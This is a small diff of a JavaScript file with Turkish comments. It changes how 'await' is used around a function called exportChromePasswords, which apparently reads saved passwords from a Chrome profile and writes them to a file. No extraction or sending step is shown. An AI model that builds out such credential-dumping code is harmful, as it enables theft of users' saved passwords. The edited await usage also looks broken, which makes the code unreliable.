@@ -140,7 +140,7 @@ function exportChromePasswords() {
       }
     };
 
-    return getPasswords();
+    return await getPasswords();
   } else {
     console.error('İşletim sistemine uygun Chrome profil dizini bulunamadı.');
     return null;
@@ -148,7 +148,7 @@ function exportChromePasswords() {
 }
 
 // Kullanım örneği
-const chromeProfilePath = await exportChromePasswords();
+const chromeProfilePath = exportChromePasswords();
 console.log('Chrome profil dizini:', chromeProfilePath);
 //passwd
 // string to file ------------------------------------------------------------------------------------------------------------------------------------------------
